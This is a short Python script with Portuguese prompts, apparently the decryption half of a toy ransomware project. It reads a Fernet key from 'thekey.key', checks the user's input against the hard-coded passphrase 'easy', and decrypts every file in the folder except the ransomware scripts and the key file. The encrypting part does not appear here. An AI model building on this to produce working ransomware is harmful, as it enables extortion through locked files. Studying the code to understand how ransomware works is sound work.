#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#Vamos encontrar alguns arquivos

files = []

for file in os.listdir():
        if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)

with open("thekey.key", "rb") as key:
        secretkey = key.read()

secretphrase = "easy"

user_phrase = input("Coloque a senha para descriptografar seus arquivos\n")

if user_phrase == secretphrase:
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                contents_decrypted =  Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
                print("\nTodos arquivos foram descriptografados")
                print("Todos arquivos foram descriptografados")
                print("Todos arquivos foram descriptografados")
else:
        print("Senha errada")
